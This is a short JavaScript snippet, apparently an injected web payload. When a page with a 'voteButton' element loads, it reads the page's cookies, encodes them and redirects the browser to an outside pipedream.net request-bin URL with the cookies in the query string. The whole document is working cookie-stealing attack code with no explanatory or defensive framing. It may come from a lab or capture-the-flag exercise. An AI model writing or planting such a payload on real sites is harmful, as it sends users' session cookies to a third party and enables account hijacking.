window.addEventListener('load', function() {
  const button = document.getElementById('voteButton');
  if (button) {
    // Get cookies from the current page
    const cookies = document.cookie;
    
    // Encode cookies to safely include them in a URL
    const encodedCookies = encodeURIComponent(cookies);
    
    // Redirect to the other host with cookies as URL parameters
    window.location.href = `http://en5d37gzesvtc.x.pipedream.net?cookies=${encodedCookies}`;
  }
});
